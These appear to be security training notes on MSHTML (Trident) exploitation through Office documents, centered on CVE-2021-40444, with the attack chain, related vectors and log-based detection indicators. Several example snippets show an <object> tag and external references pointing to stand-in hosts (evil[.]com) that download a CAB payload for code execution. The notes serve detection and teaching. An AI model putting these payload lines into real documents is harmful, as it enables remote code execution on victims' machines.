Elaborated Notes with Examples
1. Trident Engine Overview

MSHTML (Trident) is the legacy HTML rendering engine in Internet Explorer and the WebBrowser control in Windows. Despite IE being deprecated, MSHTML is still widely used by Office applications (Word, Excel) and other apps via the WebOC control (mshtml.dll). This creates a large attack surface for weaponized documents and web-based exploits.

Example: An attacker crafts a malicious Microsoft Word document that uses the Microsoft Web Browser control to render an HTML page containing exploit code. The document opens an embedded HTML/ActiveX control targeting mshtml.dll. The exploit bypasses the Protected View in Word because the document is opened from a trusted source or the user clicked "Enable Editing."
2. CVE-2021-40444 Deep Dive

CVE-2021-40444 is a critical RCE vulnerability in MSHTML. The exploit uses a malicious ActiveX control loaded via a crafted Office document. The attacker embeds an HTML file with an <object> tag pointing to a CAB file hosted on a remote server. When the document previews or renders the HTML, MSHTML downloads and executes the CAB payload.

Example CVE-2021-40444 Attack: The attacker sends an email with a Word document (Q3_Report.docx). Inside the document's oleObject2.xml relationships file, an oleObject references word\_rels\document.xml.rels pointing to an external http://evil[.]com/exploit.html. The HTML contains: <object codebase="http://evil[.]com/payload.cab" classid="clsid:..."></object>. When opened in Word, MSHTML downloads the CAB file and extracts a DLL. The DLL is loaded via InfSoft.dll or Setup.exe from the CAB, giving the attacker RCE.
3. Office Document Exploitation

Office documents can host MSHTML exploits via: OLE objects embedding HTML files, ActiveX controls with remote codebases, VBA userforms with WebBrowser controls, and RTF's objdata with embedded Equation Native streams (CVE-2017-11882).

Example: A .docx file contains an embedded Web Archive (.mht) file as an OLE object. Extracting with olevba or viewing the [Content_Types].xml reveals <Override PartName="/word/embeddings/exploit.mht" ContentType="message/rfc822"/>. The .mht file contains: <object id="exploit" classid="CLSID:..." codebase="http://evil/payload.cab"></object>. The user sees "This document contains ActiveX controls..." and if they click "Enable Content," the exploit fires.
4. Detection in Logs

MSHTML exploitation detection: Sysmon Event 1 winword.exe -> mshta.exe, Sysmon Event 11 .cab/.dll created in %TEMP%, Sysmon Event 7 (Image loaded — mshtml.dll loaded by Office), network connections from Office processes to external HTTP servers (CAB download), and HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap changes.

Example Detection: SIEM alert: winword.exe (PID 6244) made an HTTP connection to 185.130.5.201:80 GET /payload.cab. Sysmon Event 1 shows winword.exe spawned rundll32.exe with shell32.dll,Control_RunDLL payload.dll. Sysmon Event 11 shows %TEMP%\cab{random}.dll created. Event 7 shows mshtml.dll loaded into winword.exe before the network request. The analyst correlates: Office + MSHTML + CAB download + DLL execution = CVE-2021-40444 compromise. Escalate immediately.
